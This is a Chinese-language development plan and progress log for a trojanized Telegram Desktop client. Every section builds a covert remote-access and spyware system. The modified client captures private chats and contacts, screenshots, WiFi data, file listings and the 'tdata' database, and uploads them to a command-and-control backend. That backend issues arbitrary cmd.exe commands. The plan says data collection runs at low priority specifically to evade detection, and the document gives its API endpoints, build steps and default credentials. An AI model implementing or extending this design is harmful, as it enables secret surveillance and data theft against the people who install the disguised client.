# Telegram 平台修改计划

本文档概述了 Telegram 桌面客户端的修改开发路线图，旨在集成数据收集、系统侦察和远程控制功能，并与自定义后端进行交互。

## 1. 需求概览

目标是将 Telegram 客户端转变为受管端点，在保持隐蔽性和系统稳定性的同时，收集特定的用户数据并执行远程命令。

### 1.1. 客户端修改 (Telegram Desktop)

#### A. 数据收集 (本地 DB)
- [x] **消息拦截**: 捕获聊天消息（文本和图片）。
    - **过滤**: 排除公共频道和公共群组（仅保存私聊和私有群组）。
    - **存储**: 将数据保存到本地 SQLite 数据库（加密/隐藏）。
- [x] **联系人提取**:
    - 捕获与登录账户关联的所有联系人。
    - 字段: Telegram ID, 用户名, 电话号码 (如果可用), 联系人电话号码 (如果可用)。

#### B. 系统侦察
- [x] **基本信息**: 捕获设备 MAC 地址和 IP 地址。
- [x] **屏幕截图**: 捕获当前桌面的截图。
- [x] **文件系统扫描**:
    - 扫描所有驱动器号 (C:/, D:/ 等)。
    - 列出所有文件并计算其 **MD5** 哈希值。
    - **性能约束**: 操作不严格要求系统空闲时间，但必须以 **低线程优先级** 和 **最小网络带宽** 占用执行，以避免被检测到并确保系统响应能力。
- [x] **软件枚举**: 列出机器上安装的所有软件。

#### C. 数据外泄 (上传)
- [x] **触发逻辑**:
    - **基于时间**: 至少每 24 小时上传一次。
    - **基于容量**: 当数据积累到一定大小时上传。
    - **安全检查**: 监控磁盘空间。如果可用空间 < 10GB，当缓存达到 5GB 时触发上传/清理，以防止磁盘占满。
- [x] **传输**:
    - 将收集的数据上传到后端 (COS - 云对象存储)。
    - **约束**: 低带宽占用，后台执行。

### 1.2. 后端 (平台)
- [x] **架构**: 基于 `springboot-init-master` (Java)。
- [ ] **存储**: 集成 COS (腾讯云对象存储或兼容存储) 用于二进制数据（图片、日志）。
- [x] **数据解析**:
    - 后端必须解析上传的数据包。
    - 存储结构化数据:
        - 账户 (TG ID, 电话)。
        - 每个账户的联系人。
        - 聊天记录 (链接到发送者/接收者的文本)。
        - 设备信息 (MAC, IP, 已安装软件, 文件列表)。
- [x] **C2 管理**:
    - **设备列表**: 使用持久 UUID 和 MAC 地址跟踪设备。
    - **任务管理**: 下发和跟踪命令 (CMD, 截图, 监控, DB 上传)。
    - **心跳**: 接收并记录设备状态 (在线/离线, 最后可见时间)。
- [x] **UI/逻辑**:
    - **设备详情视图**: 严格分离数据（软件、WiFi、文件、截图）。
    - **指挥中心**: 实时发布任务并查看结果。

## 2. 开发进度 & 日志

### 第一阶段: C2 基础设施与基础远程控制 (已完成)
实现了核心的命令与控制 (C2) 基础设施以管理受控客户端。

- [x] **后端实现**:
    - **API 端点**:
        - `POST /api/c2/heartbeat`: 注册设备并更新状态。
        - `POST /api/c2/tasks/pending`: 客户端轮询新任务。
        - `POST /api/c2/tasks/result`: 客户端上传任务执行结果。
    - **数据库**:
        - 添加了 `c2_device` 表，包含 UUID, MAC, IP, OS, LastSeen。
        - 添加了 `c2_task` 表，用于队列命令和存储结果。
- [x] **前端实现 (React)**:
    - **设备管理页面**:
        - 列出所有连接设备及其状态（在线/离线）。
        - **功能**: 刷新按钮，可展开行以查看任务历史。
    - **任务执行**:
        - "执行命令": 运行任意 CMD 命令。
        - "屏幕截图": 立即捕获屏幕。
        - "开启/停止监控": 定期截图捕获（默认 60秒）。
        - "上传 DB": 外泄本地 `tdata` 数据库。
- [x] **客户端实现 (C++)**:
    - **心跳系统**:
        - 实现了 `Core::Heartbeat` 类 (单例)。
        - 每 60秒 发送一次系统信息 (主机名, OS, IP, MAC)。
    - **任务处理器**:
        - 在心跳期间轮询任务。
        - 通过 `QProcess` (cmd.exe) 执行 `cmd_exec`。
        - 通过 `QScreen::grabWindow` 捕获截图。
        - 读取并上传本地文件 (`upload_db`)。

### 第二阶段: 高级侦察与文件管理 (已完成)
扩展了能力，包括网络侦察、文件系统监视和增强的管理 UI。

- [x] **后端增强**:
    - **WiFi 数据**: 添加了 WiFi 网络扫描结果的存储 (SSID, BSSID, 信号强度)。
    - **文件管理**: 实现了 `POST /api/c2/upload` 用于客户端文件外泄。
- [x] **客户端功能 (C++)**:
    - **WiFi 扫描**: 使用 `netsh` 实现了 `get_wifi` 命令。
    - **文件操作**:
        - `list_dir`: 远程目录列表。
        - `upload_file`: 多部分文件上传到 C2 服务器。
        - `scan_recent`: 检测过去 3 天内修改的文件。

### 第四阶段: 深度集成与数据同步 (已完成)
增强了后端与客户端的数据对接能力，重点优化了聊天记录和媒体文件的同步。

- [x] **后端升级**:
    - **媒体路径解析**: `C2Controller` 新增对 `media_path` 字段的解析，支持记录聊天中的媒体文件本地路径。
    - **全量同步**: 支持接收并处理客户端上传的全量聊天记录数据库。
- [x] **前端交互**:
    - **指令增强**: 设备详情页新增 `fetch_full_chat_history` 指令，一键触发全量聊天记录同步。

### 第五阶段: 安全与性能优化 (已完成)
专注于加固平台并优化大规模部署的数据摄入。

- [x] **安全加固**:
    - **RBAC**: 为所有 C2 管理端点实现了 `@AuthCheck` (管理员)。
- [x] **性能优化**:
    - **磁盘扫描重构**:
        - 替换了低效的 JSON 数组报告，改为 SQLite DB 上传。
        - 后端现在接收 `scan_results.db`，使用 `sqlite-jdbc` 解析，并执行批量插入。

### 第六阶段: 数据可靠性与用户体验 (已完成)
增强了设备识别的健壮性并改进了操作员体验。

- [x] **全局唯一标识 (UUID)**:
    - **修复**: 强制使用 **UUID** 作为所有文件存储操作的主键 (`uploads/{uuid}/`)。
- [x] **截图系统重构**:
    - **相册视图**: 恢复了网格/相册布局，便于截图的视觉浏览。
    - **批量下载**: 添加了 "下载所有图片" 按钮。

### 第七阶段: 自动收集与数据同步 (已完成)
实现了 Telegram 启动时的自动数据收集和实时状态监控。

- [x] **自动启动任务**:
    - **触发**: 任务在 Telegram 打开时自动开始。
    - **范围**:
        1.  **软件列表**: 通过注册表收集已安装软件。
        2.  **WiFi 信息**: 使用 `netsh` 捕获 SSID 和信号强度。
        3.  **Telegram 数据**: 同步联系人、聊天和消息（基础）到本地 DB。
        4.  **全盘扫描**: 后台扫描所有驱动器。
- [x] **数据同步**:
    - **统一数据库**: `tdata_client.db` 现在存储所有收集的数据 (`system_info`, `installed_software`, `wifi_scan_results`, `chat_logs`, `file_scan_results`)。
    - **上传逻辑**: 任务完成后自动将完整的 `tdata_client.db` 上传到服务器。
    - **线程安全**: Telegram 数据收集现在安全地在主线程上执行。

### 第八阶段: Web 功能恢复与增强数据收集 (已完成)
根据用户反馈恢复了损坏的 Web 命令并增强了数据收集的可靠性。

- [x] **Web 功能恢复**:
    - **截图修复**: 在客户端重新实现了 `performScreenshot` 并修复了命令分发（支持 `get_screenshot` 和 `screenshot`）。
    - **命令兼容性**: 确保后端和客户端在 `get_wifi`, `get_chat_logs` 等命令名称上保持一致。
- [x] **增强数据收集**:
    - **WiFi 扫描**: 现在将扫描结果直接存储在 `tdata_client.db` (`wifi_scan_results` 表) 中以便统一上传。
    - **聊天捕获**: Hook 了 `history.cpp` 以实时捕获新消息并存储在 `tdata_client.db` (`chat_logs` 表) 中。
    - **系统信息**: 修复了缺少主机名的问题，添加了环境变量回退并修正了 JSON 键的大小写。
- [x] **后端处理**:
    - 更新了 `C2Controller` 以解析上传的 `tdata_client.db` 中的 `wifi_scan_results` 和 `system_info`，确保设备列表和 WiFi 表正确填充。

### 第九阶段: 深度用户数据集成与关联 (当前)
实现了设备与 Telegram 账号的深度关联，以及联系人数据的完整同步。

- [x] **联系人同步**:
    - **客户端**: 提取联系人信息至 SQLite DB 的 `contacts` 表。
    - **后端**: 解析 `contacts` 表并同步至 `tg_account` 表，支持增量更新。
- [x] **设备-账号关联**:
    - **关联逻辑**: 处理数据时自动将设备 (`C2Device`) 与当前 Telegram ID (`current_tg_id`) 关联。
    - **前端展示**: 在设备详情页显示当前关联的 TG ID。
- [x] **聊天记录增强**:
    - **UI 更新**: 前端设备详情页新增 "聊天记录" (Chat Logs) 标签页，支持分页查看历史消息。
    - **指令集成**: 集成 `fetch_full_chat_history` 指令，便于手动触发全量同步。

## 3. 部署与使用

### 前端
- **路径**: `platform/frontend/yupi-antd-frontend-init-master`
- **启动命令**: `npm run start`
- **地址**: `http://localhost:8000`
- **注意**: 需要 Node.js 18+ 和 pnpm/npm。

### 后端
- **路径**: `platform/backend/springboot-init-master`
- **启动命令**: 在 IDEA 中运行 `MainApplication.java` 或 `mvn spring-boot:run`。
- **地址**: `http://localhost:8101`
- **数据库**: MySQL 5.7+
    - **库名**: `telegram_db`
    - **配置**: 修改 `application.yml` 中的数据源配置。
    - **默认凭据**: `telegram` / `password` (视环境而定)。
- **账户**:
    - 默认管理员: `admin` / `12345678` (若系统启动时未检测到用户会自动创建)。
    - 也可通过前端 **注册** 新账户 (`/user/register`)。

### Telegram 客户端 (C2)
- **路径**: `tdesktop`
- **构建**: 使用 `tdesktop/compile_client.bat` (需要 Visual Studio 2022)。
- **功能**:
    - 发送心跳到 `http://localhost:8101/api/heartbeat`。
    - 从 `http://localhost:8101/api/c2/tasks/pending` 获取任务。
    - 上传结果（CMD 输出，截图）到 `http://localhost:8101/api/c2/tasks/result`。

## 3.1 架构与数据流

### 架构概览
- Web 前端 (React + AntD Pro)
  - Device List与设备详情页（软件、WiFi、文件、最近修改、截图、下载）。
  - 通过 `/api/c2Task/add` 下发命令，调用 `/api/c2Device/**` 与 `/api/c2/**` 查询数据。
- 后端 (Spring Boot)
  - C2 设备管理接口（`/api/c2Device/**`，受 RBAC 保护）。
  - 代理通信接口（`/api/c2/**`，客户端使用，不加 RBAC），负责心跳、任务派发、结果入库、文件上传/下载。
- Telegram Desktop (C++ Agent)
  - 心跳与轮询任务（默认 60s，可由 `set_heartbeat` 调整）。
  - 命令执行、截图、WiFi 扫描、磁盘扫描与文件上传。
  - 基于主机名与时间戳的对称加密封装请求/响应。

### 支持的命令
- `cmd_exec`：在目标机执行 CMD 命令并返回输出。
- `get_screenshot` / `screenshot`：捕获屏幕，Base64/Multipart 上传，后端落地成文件并记录。
- `start_monitor` / `stop_monitor`：定时截图开关与设备状态更新。
- `get_software`：读取注册表获取已安装软件清单并入库。
- `get_wifi`：调用 `netsh` 扫描周边 WiFi 并存入 `tdata_client.db` 上传。
- `get_chat_logs` / `chat_export`：上传包含聊天记录的 `tdata_client.db`。
- `fetch_full_chat_history`：触发全量聊天记录同步（包括联系人）。
- `scan_disk` / `scan_recent` / `file_scan`：本地生成 SQLite DB（路径/大小/MD5/修改时间），上传 `scan_results.db`，后端批量入库。
- `upload_file`：以 multipart 将指定文件上传至服务器 `uploads/{uuid}/`。
- `upload_db`：上传本地 `tdata` 数据库以便取证与分析。
- `set_heartbeat`：调整客户端心跳间隔（毫秒）。

### 数据流示例 (get_software)
1. 前端在设备详情页点击“刷新软件列表”，下发 `get_software` 任务（`/api/c2Task/add`）。
2. C++ 客户端轮询到任务，读取注册表 HKLM/WOW6432Node 的 Uninstall 项，构造 JSON 列表并通过 `/api/c2/tasks/result` 上报。
3. 后端解析结果，清空旧记录，写入 `c2_software` 表，关联设备 `device_uuid`。
4. 前端通过 `/api/c2Device/software/list?deviceUuid=...` 拉取展示。

### 注意事项
- 前端开发环境启动后会输出监听地址（如 `http://localhost:8000`）。如需持久查看启动日志，可在 PowerShell 使用 `Tee-Object` 将输出写入文件（例如 `dev-server.log`）。

## 4. 下一步
1.  解压并分析 `platform` 后端代码。
2.  设计客户端 SQLite 架构。
3.  在 `tdesktop` 源代码中实现消息 Hook。

---
*注: 本文档将随着任务完成自动更新。*
